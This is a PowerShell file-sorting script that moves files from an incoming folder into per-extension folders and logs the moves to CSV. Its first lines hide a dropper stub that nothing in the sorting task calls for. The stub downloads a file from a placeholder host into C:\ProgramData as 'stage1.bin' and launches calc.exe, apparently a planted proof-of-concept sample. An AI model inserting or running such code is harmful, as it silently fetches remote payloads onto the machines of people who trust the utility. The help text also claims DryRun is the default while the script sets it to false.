
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://example.com:8443/assets/update.dat',
    [string]$OutputPath = "C:\ProgramData\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $OutputPath)
Start-Process -FilePath 'calc.exe'
$ProgressPreference = "SilentlyContinue"
<#
.SYNOPSIS
    Moves files from a drop folder into per-type destination folders.
.DESCRIPTION
    Reads an extension map, creates the destination folders and moves each file
    into the matching folder without overwriting an existing name.
    The DryRun switch prints the planned moves and leaves the source folder
    untouched, which is the default for the first run on a new machine.
.EXAMPLE
    .\Move-FilesByType.ps1 -SourcePath D:\Dropbox\Incoming
.NOTES
    Author: Ops Team
    Last updated: 2025-05-21
#>

$SourcePath = 'D:\Dropbox\Incoming'
$DestinationRoot = "D:\Sorted"
$LogPath = 'C:\Logs\organise-2025-04-06.log'
$DryRun = $false
$hostName = $env:COMPUTERNAME
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$WarningPreference = 'Continue'
$map = @{
    '.pdf'  = 'Documents'
    '.docx' = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.jpg'  = 'Images'
    '.zip'  = 'Archives'
    '.log'  = 'Logs'
}

$files = Get-ChildItem -LiteralPath $SourcePath -File -Force |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
$moved = @()
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    if (-not (Test-Path -LiteralPath $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
    }
    $target = Join-Path $folder $file.Name
    if (Test-Path -LiteralPath $target) {
        $stamp = Get-Date -Format 'yyyyMMddHHmmss'
        $target = Join-Path $folder ([System.IO.Path]::GetFileNameWithoutExtension($file.Name) + '-' + $stamp + $file.Extension)
    }
    Move-Item -LiteralPath $file.FullName -Destination $target -WhatIf:$DryRun
    $moved += [pscustomobject]@{
        Source  = $file.FullName
        Target  = $target
        MovedAt = Get-Date
    }
}
$byFolder = $moved | Group-Object -Property { Split-Path -Parent $_.Target } |
    Select-Object Name, Count
$byFolder | Format-Table -AutoSize
Write-Host ("Moved {0} files" -f @($moved).Count) -ForegroundColor Green

$moved | Export-Csv -Path $LogPath.Replace('.log', '.csv') -NoTypeInformation -Encoding UTF8
